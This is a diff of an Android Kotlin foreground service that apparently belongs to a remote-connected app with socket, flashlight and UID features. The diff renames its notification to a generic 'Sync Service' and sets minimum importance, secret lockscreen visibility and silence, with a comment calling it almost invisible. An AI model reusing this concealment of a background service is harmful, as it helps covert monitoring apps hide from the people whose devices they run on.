@@ -83,12 +83,18 @@ override fun onCreate() {
     super.onCreate()
     createNotificationChannel()
 
-    // Foreground service type: cukup SPECIAL_USE (overlay & TTS)
+    // 🔥 FIX: cukup SPECIAL_USE karena manifest sudah minimalis
     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
         startForeground(
             NOTIF_ID,
             buildNotification(),
-            android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
+            ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
+        )
+    } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+        startForeground(
+            NOTIF_ID,
+            buildNotification(),
+            ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
         )
     } else {
         startForeground(NOTIF_ID, buildNotification())
@@ -107,7 +113,6 @@ override fun onCreate() {
     val model = Build.MODEL
     deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"
 
-    // CameraManager tetap dipakai untuk flashlight (torch)
     cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
     torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
         cameraManager?.getCameraCharacteristics(id)
@@ -117,7 +122,6 @@ override fun onCreate() {
     val filter = IntentFilter().apply {
         addAction(ACTION_CONNECT)
         addAction(ACTION_SEND_STATUS)
-        // ❌ ACTION_SCREEN_RESULT & NEW_NOTIF dihapus — fitur screen/notif udah nggak ada
     }
     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
         registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
@@ -1191,20 +1195,46 @@ private fun readUid(): String {
     socket = null
 }
 
-    private fun buildNotification(): Notification =
-        NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("SyncXxX")
-            .setContentText("")
-            .setSmallIcon(android.R.drawable.ic_menu_info_details)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .build()
+    private fun buildNotification(): Notification {
+    val contentIntent = PendingIntent.getActivity(
+        this,
+        0,
+        Intent(this, MainActivity::class.java).apply {
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
+        },
+        PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
+    )
 
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(CHANNEL_ID, "Sync XxX Service", NotificationManager.IMPORTANCE_LOW)
-            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
+    return NotificationCompat.Builder(this, CHANNEL_ID)
+        .setContentTitle("Sync Service")
+        .setContentText("Berjalan di background")
+        .setSmallIcon(android.R.drawable.ic_menu_info_details)
+        .setContentIntent(contentIntent)
+        .setOngoing(true)
+        .setPriority(NotificationCompat.PRIORITY_MIN)  // 🔥 MIN = paling silent
+        .setCategory(NotificationCompat.CATEGORY_SERVICE)
+        .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+        .setSilent(true)
+        .build()
+}
+
+private fun createNotificationChannel() {
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+        val ch = NotificationChannel(
+            CHANNEL_ID,
+            "Sync Service",
+            NotificationManager.IMPORTANCE_MIN  // 🔥 MIN = nyaris invisible
+        ).apply {
+            description = "Service background"
+            setSound(null, null)
+            enableVibration(false)
+            setShowBadge(false)
+            lockscreenVisibility = Notification.VISIBILITY_SECRET
         }
+        val nm = getSystemService(NotificationManager::class.java)
+        nm.createNotificationChannel(ch)
     }
+}
 
     private var mediaPlayer: android.media.MediaPlayer? = null
 
